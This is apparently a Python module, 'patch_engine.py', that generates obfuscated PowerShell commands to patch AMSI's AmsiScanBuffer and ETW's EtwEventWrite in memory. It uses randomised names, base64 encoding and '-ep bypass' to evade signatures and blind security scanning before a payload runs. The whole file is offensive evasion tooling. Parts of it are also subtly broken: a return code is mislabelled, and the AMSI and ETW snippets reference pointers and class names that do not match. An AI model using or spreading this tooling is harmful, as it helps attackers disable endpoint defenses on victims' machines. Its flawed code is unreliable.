"""
patch_engine.py — ETW / AMSI Runtime Patch Generator

Generates polymorphic PowerShell snippets that patch AmsiScanBuffer and/or
EtwEventWrite in-process memory at runtime, disabling scanning and telemetry
before payload execution.

All variable names are randomised on each call to beat static signatures.
"""
import random
import string
import base64


def _rand_var(length=8):
    """Generate a random variable name starting with a letter."""
    return random.choice(string.ascii_letters) + ''.join(
        random.choices(string.ascii_letters + string.digits, k=length - 1)
    )


class PatchEngine:

    @staticmethod
    def amsi_patch(obfuscate=True):
        """
        Generates a PowerShell snippet that patches AmsiScanBuffer to return
        AMSI_RESULT_CLEAN (0x80070057) via a single-byte RET stub.
        Variable names are randomised on every call.
        """
        v_ref       = _rand_var()
        v_type      = _rand_var()
        v_method    = _rand_var()
        v_ptr       = _rand_var()
        v_patch     = _rand_var()

        # Patch bytes: mov eax, 0x80070057; ret
        patch_bytes = "0x{:02X},0x{:02X},0x{:02X},0x{:02X},0x{:02X},0x{:02X}".format(
            0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        )

        ps = f"""
${v_ref} = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
${v_type} = ${v_ref}.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
${v_method} = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr m, string p);' `
     -Name '{_rand_var()}' -Namespace '{_rand_var()}' -PassThru)::GetProcAddress(
        (Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetModuleHandle(string m);' `
         -Name '{_rand_var()}' -Namespace '{_rand_var()}' -PassThru)::GetModuleHandle('amsi.dll'),
        'AmsiSc'+'anBuffer'),
    (Add-Type -MemberDefinition '' -Name '{_rand_var()}' -PassThru))
${v_ptr} = ${v_method}.Method.MethodHandle.GetFunctionPointer()
${v_patch} = [Byte[]]({patch_bytes})
[Runtime.InteropServices.Marshal]::Copy(${v_patch}, 0, ${v_ptr}, 6)
"""
        if obfuscate:
            encoded = base64.b64encode(ps.encode('utf-16-le')).decode()
            return f'powershell -ep bypass -enc {encoded}'
        return ps.strip()

    @staticmethod
    def etw_patch(obfuscate=True):
        """
        Generates a PowerShell snippet that patches EtwEventWrite in ntdll
        with a RET instruction, killing event tracing for the current process.
        """
        v_ntdll   = _rand_var()
        v_addr    = _rand_var()
        v_patch   = _rand_var()
        v_old     = _rand_var()
        v_newprot = _rand_var()

        ps = f"""
$code = @'
using System;
using System.Runtime.InteropServices;
public class {_rand_var()} {{
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string m);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UInt32 s, UInt32 np, out UInt32 op);
}}
'@
Add-Type $code
${v_ntdll}  = [ETW].GetMethod('GetModuleHandle').Invoke($null, @('ntdll.dll'))
${v_addr}   = [ETW].GetMethod('GetProcAddress').Invoke($null, @(${v_ntdll}, 'EtwE'+'ventWrite'))
${v_old}    = [UInt32]0
${v_newprot}= [UInt32]0x40
[ETW].GetMethod('VirtualProtect').Invoke($null, @(${v_addr}, [UInt32]1, ${v_newprot}, [ref]${v_old})) | Out-Null
${v_patch}  = [Byte[]](0xC3)
[Runtime.InteropServices.Marshal]::Copy(${v_patch}, 0, ${v_addr}, 1)
""".replace('[ETW]', f'[{_rand_var()}]')

        if obfuscate:
            encoded = base64.b64encode(ps.encode('utf-16-le')).decode()
            return f'powershell -ep bypass -enc {encoded}'
        return ps.strip()

    @staticmethod
    def all_patches(obfuscate=True):
        """
        Returns a combined AMSI + ETW patch snippet.
        When obfuscated, the two patches are merged and base64-encoded together.
        """
        amsi = PatchEngine.amsi_patch(obfuscate=False)
        etw  = PatchEngine.etw_patch(obfuscate=False)
        combined = f"# AMSI Patch\n{amsi}\n\n# ETW Patch\n{etw}"

        if obfuscate:
            encoded = base64.b64encode(combined.encode('utf-16-le')).decode()
            return f'powershell -ep bypass -enc {encoded}'
        return combined
